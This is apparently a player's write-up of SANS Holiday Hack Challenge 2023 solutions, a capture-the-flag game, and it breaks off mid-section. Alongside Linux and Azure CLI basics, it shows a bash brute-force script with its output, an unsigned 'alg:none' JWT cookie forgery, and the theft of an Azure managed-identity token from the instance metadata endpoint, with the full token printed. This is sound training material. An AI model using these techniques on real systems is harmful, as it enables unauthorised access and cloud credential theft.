# SANS Holiday Hack Challenge 2023

---

## Objective: Holiday Hack Orientation

To start you need to maneuver your boat and dock at Christmas Island: Oritentation

![Picture of boat at sea heading towards Orientation Island](/docs/assets/images/Dock.png)

### Task 1: First Terminal Challenge

This is just to get your feet wet, simply enter

```
answer
```

to complete the challenge.

![](/docs/assets/images/Orientation.png)

---

## Objective: Snowball Fight

You could play with another player to fight Santa and win, but that defeats the whole purpose of hacking...

If you look at the source code of the iframe, you will find a singlePlayer variable. You will see that if it is set to "true", a computer player is added to the game allowing you to play solo. 

![](/docs/assets/images/SinglePlayer.png)

Once you load into a private room, you can view the frame info to find the URL the frame is loading from. You will see the singleplayer variable set to false. If you copy the URL and update the <iframe> tag in Inspect with that URL and setting that variable to "true" it will load a single player game. 

Once you defeat Santa, you achieve GLORY!

![](/docs/assets/images/VICTORY.png)

However... why stop there?! You can also use the console once the game is started to alter other variables such as snowballDmg, playersVelocity, santaThrowDelay and more. There's many ways to make this challenge more fun. Pelting elves with no damage taken, who doesn't enjoy that?!

![](/docs/assets/images/Variables.png)

---

## Objective: Linux 101

Task 1: Perform a directory listing of your home directory to find a troll and retrieve a present!

Answer:

```
ls
```

Task 2: Now find the troll inside the troll.

Answer: 

```
cat troll 19315479765589239
```

Task 3: Great, now remove the troll in your home directory.

Answer: 

```
rm troll 19315479765589239
```

Task 4: Print the present working directory using a command.

Answer: 

```
pwd
```

Task 5: Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!

Answer: 

```
ls -la
cat .troll_5074624024543078
```

Task 6: Excellent, now find the troll in your command history.

Answer: 

```
history
```

Task 7: Find the troll in your environment variables.

Answer: 

```
env
```

Task 8: Next, head into the workshop.

Answer: 

```
cd workshop
```

Task 9: A troll is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the troll is in.

Answer: 

```
grep -ri "troll"
```

Task 10: 

Answer: 

```
chmod +x present engine
./present engine
```

Task 11: Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.

Answer: 

```
cd /home/elf/workshop electrical
mv blown_fuse0 fuse0
```

Task 12:  Now, make a symbolic link (symlink) named fuse1 that points to fuse0

Answer:

```
ln -s fuse0 fuse1
```

Task 13: Make a copy of fuse1 named fuse2.

Answer: 

```
cp fuse1 fuse2
```

Task 14: We need to make sure trolls don't come back. Add the characters "TROLL_REPELLENT" into the file fuse2

Answer: 

```
echo "TROLL_REPELLENT" > fuse2
```

Task 15: Find the troll somewhere in /opt/troll_den.

Answer: 

```
find /opt/troll_den/ -iname "troll*"
```

Task 16: Find the file somewhere in /opt/troll_den that is owned by the user troll.

Answer: 

```
find /opt/troll_den/ -user "troll"
```

Task 17: Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.

Answer: 

```
find /opt/troll_den/ -size +108k -size -110k
```

Task 18: List running processes to find another troll

Answer: 

```
ps aux
```

Task 19: The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.

Answer:

```
netstat -l
```

Task 20: The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.

Answer: 

```
curl 0.0.0.0:54321
```

Task 21: Your final task is to stop the 14516_troll process to collect the remaining presents.

Answer:

```
ps aux
kill 12771
```

---

## Objective: Reportinator

I decided to take the easy way out and brute force this one. To brute force this, I utilized BurpSuite's proxy module to help capture a submission attempt. This helped me realize that for each of the 9 findings, they were simply included in the HTTP POST as input1 through input9. A valid finding was set to and a hallucination was set to 1.  

I then utilized my good friend, ChatGPT, to quickly script up a bash script to automate brute forcing against the application. After a lot of debugging and trial and error, the below script ultimately worked. 

```bash
#!/bin/bash

url="http://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com/check"

# Set the cookies
cookies="ReportinatorCookieYum=eyJ1c2VyaWQiOiI3NjhmOTNkNi0xNDc3LTQ0ZTYtOWZhMC0yMzg1NjM4OTk3YTYifQ.ZXcm6g.QnBaeGlhHzGVdw5Aw4ZETgqQzU8"

for a in 0 1; do
  for b in 0 1; do
    for c in 0 1; do
      for d in 0 1; do
        for e in 0 1; do
          for f in 0 1; do
            for g in 0 1; do
              for h in 0 1; do
                for i in 0 1; do
                  response_code=$(curl -s -w "%{http_code}" -o /dev/null -X POST -H "Host: hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com" \
                                          -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
                                          -H "Accept: */*" \
                                          -H "Accept-Language: en-US,en;q=0.5" \
                                          -H "Accept-Encoding: gzip, deflate, br" \
                                          -H "Referer: http://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com/?&challenge=reportinator&" \
                                          -H "Content-Type: application/x-www-form-urlencoded" \
                                          -H "Content-Length: 89" \
                                          -H "Origin: http://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com" \
                                          -H "Connection: close" \
                                          -H "Cookie: $cookies" \
                                          -d "input-1=$a&input-2=$b&input-3=$c&input-4=$d&input-5=$e&input-6=$f&input-7=$g&input-8=$h&input-9=$i" \
                                          $url)

                  echo "Attempt for a=$a b=$b c=$c d=$d e=$e f=$f g=$g h=$h i=$i - Response code: $response_code"

                  if [ "$response_code" -eq 200 ]; then
                    echo "Success for a=$a b=$b c=$c d=$d e=$e f=$f g=$g h=$h i=$i"
                    exit 0  # You can exit the script if a successful response is received
                  else
                    echo "Retry for a=$a b=$b c=$c d=$d e=$e f=$f g=$g h=$h i=$i"
                  fi
                done
              done
            done
          done
        done
      done
    done
  done
done

echo "No successful combination found."
exit 1
```

Script output:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ./brute\ \(copy\ 1\).sh 
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=0 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=0 f=1 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=0 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=0 e=1 f=1 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=0 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=0 f=1 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=0 g=1 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=0 h=1 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=0 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=0 i=1
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=1 i=0
Attempt for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=0 d=1 e=1 f=1 g=1 h=1 i=1
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=0 i=0
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=0 i=1
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=1 i=0
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=0 h=1 i=1
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=0 i=0
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=0 i=1 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=0 i=1
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=1 i=0 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=1 i=0
Attempt for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=1 i=1 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=0 g=1 h=1 i=1
Attempt for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=0 - Response code: 400
Retry for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=0
Attempt for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=1 - Response code: 200
Success for a=0 b=0 c=1 d=0 e=0 f=1 g=0 h=0 i=1
```

After finding my successful combination, I re-launched the game and submitted a report with findings 3, 6, and 9 marked as hallucinations. 

GLORY!

---

## Objective: Azure 101

Task 1: You may not know this but the Azure cli help messages are very easy to access. First, try typing:
$ az help | less

Answer: 

```
az help | less
```

Task 2: Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )

Answer: 

```
az account show | less
```

![](/docs/assets/images/azshow.png)

Task 3: Excellent! Now get a list of resource groups in Azure.
For more information:
https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest

Answer: 

```
az group list
```

![](/docs/assets/images/azgroup.png)

Task 4: Ok, now use one of the resource groups to get a list of function apps. For more information:
https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest
Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves.

Answer: 

```
az functionapp list -g "northpole-rg1"
```

You could've also used northpole-rg2 here. This also revealed an interesting URL: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

![](/docs/assets/images/azfunctionapp.png)

Task 5: Find a way to list the only VM in one of the resource groups you have access to.
For more information:
https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest

Answer: 

```
az vm list -g "northpole-rg2"
```

![](/docs/assets/images/azvms.png)

Task 6: Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM.
For more information:
https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke

Answer: 

```
az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "ls"
```

![](/docs/assets/images/azls.png)

---

## Objective: Elf Hunt

After reading about JSON Web Tokens (JWTs), I learned about a flaw to force the server to accept a token with no signature present. I found a cookie that appeared to be the JWT for Elf Hunt called "ElfHunt_JWT". The JWT was already flawed since the "alg" parameter was set to none, which made my job easier. I simply had to decode the cookie using CyberChef. It took a few tries messing around with the speed until the elves were just fast enough...

Original Cookie: 

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.
```

Decoded Original: 

```
{"alg":"none","typ":"JWT"}>{"speed":-500}>
```

Answer: I ended up finding that -50 was a good speed. I replaced the cookie in my session with my new base64 encoded speed variable. The full cookie value became 

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwfT4.
```

GLORY:

![](/docs/assets/images/elfhunt.png)

---

## Objective: Certificate SSHenanigans

Domain: **ssh-server-vm.santaworkshopgeeseislands.org** 

Account: **monitor**

Goal: **access TODO list**

---

Generate key pair

```bash
 ssh-keygen -t rsa -C "elf@ssh-server-vm.santaworkshopgeeseislands.org"
```

Paste the public key into

```
 https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
```

This will generate the signed certificate. Only copy the necessary parts for the certificate and save to your host under a file name of your choice. I used "signed.pub"

Use the cert and your private key to access ssh-server-vm.santaworkshopgeeseislands.org

```bash
┌──(root㉿kali)-[~/HHC23]
└─# ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i signed.pub -i id_rsa 
```

Ctrl+C to exit the application that loads on login

![](/docs/assets/images/ssh1.png)

Generate access token ([Use managed identities on a virtual machine to acquire access token - Microsoft Entra ID | Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token))

```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
```

Output

```bash
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MDE5NzcsIm5iZiI6MTcwMjQwMTk3NywiZXhwIjoxNzAyNDg4Njc3LCJhaW8iOiJFMlZnWUZqbU5HLzd0VDNPZC9VbkIvZUhPQzFqQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJQLWJ6M3dkTmVVcTg3U29SSHVSSUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.GNKxaoFJEZnWENNPHiIc1KZbUaUODbCYMIgTWUY-7pEhVp_VqT0dPeeXRGStfaWDs3NoRKy72jkacg-aDSsqLKLYUZmAZAe9BJGk8eEnO0xUWSIyoJmzgbGMkv2uk9lwYfOcVD_MtEj0_cP9XdkAuIN7tuLWyUc7EKfvo671gNZPBfHyLSZ1yekmrOJjvNyQ8bMNT7X4zEZEg0dKdnovOeXhJjeX_2abJv0I4ddtDN-Cm-DsVDc3OcgiZGB4G2l603qbsYobde41pMMqhsz1iGjtGNbMDQyky0zwQGFxNzMjlsgiC7J3zrvmcPe_dSJILQTE4MdnH1AdQYiTmBBW4Q","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85753","expires_on":"1702488677","ext_expires_in":"86399","not_before":"1702401977","resource":"https://management.azure.com/","token_type":"Bearer"}
```

Store token in result

```bash
result="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MDE5NzcsIm5iZiI6MTcwMjQwMTk3NywiZXhwIjoxNzAyNDg4Njc3LCJhaW8iOiJFMlZnWUZqbU5HLzd0VDNPZC9VbkIvZUhPQzFqQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJQLWJ6M3dkTmVVcTg3U29SSHVSSUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.GNKxaoFJEZnWENNPHiIc1KZbUaUODbCYMIgTWUY-7pEhVp_VqT0dPeeXRGStfaWDs3NoRKy72jkacg-aDSsqLKLYUZmAZAe9BJGk8eEnO0xUWSIyoJmzgbGMkv2uk9lwYfOcVD_MtEj0_cP9XdkAuIN7tuLWyUc7EKfvo671gNZPBfHyLSZ1yekmrOJjvNyQ8bMNT7X4zEZEg0dKdnovOeXhJjeX_2abJv0I4ddtDN-Cm-DsVDc3OcgiZGB4G2l603qbsYobde41pMMqhsz1iGjtGNbMDQyky0zwQGFxNzMjlsgiC7J3zrvmcPe_dSJILQTE4MdnH1AdQYiTmBBW4Q"
```

Web Apps - Get Source Control ([Web Apps - Get Source Control - REST API (Azure App Service) | Microsoft Learn](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01))

```bash
